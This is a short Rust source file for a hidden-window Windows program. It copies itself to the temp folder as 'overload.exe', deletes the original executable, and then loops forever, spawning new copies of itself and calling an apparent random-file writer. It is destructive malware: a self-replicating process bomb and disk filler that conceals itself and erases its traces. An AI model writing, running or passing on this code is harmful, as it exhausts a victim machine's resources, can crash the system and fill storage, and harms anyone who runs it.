#![windows_subsystem = "windows"]

mod utils;

use std::{env, fs, process::Command};
use utils::{join_paths, random_file, self_copy};

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        let dir = join_paths(env::var("temp").expect(""), "overload.exe".to_string());
        self_copy(dir.clone()).unwrap();

        let del_path = args.first().unwrap();
        Command::new(dir)
            .arg("-cr")
            .arg(del_path)
            .spawn()
            .expect("");
    } else if *args.get(1).unwrap() == "-cr" {
        fs::remove_file(args.get(2).unwrap()).unwrap();
        Command::new("overload.exe").arg("-c").spawn().expect("");
    } else if *args.get(1).unwrap() == "-c" {
        loop {
            tokio::spawn(async {
                Command::new("overload.exe").arg("-c").spawn().expect("");
                random_file().await.unwrap();
            })
            .await
            .unwrap();
        }
    }
}
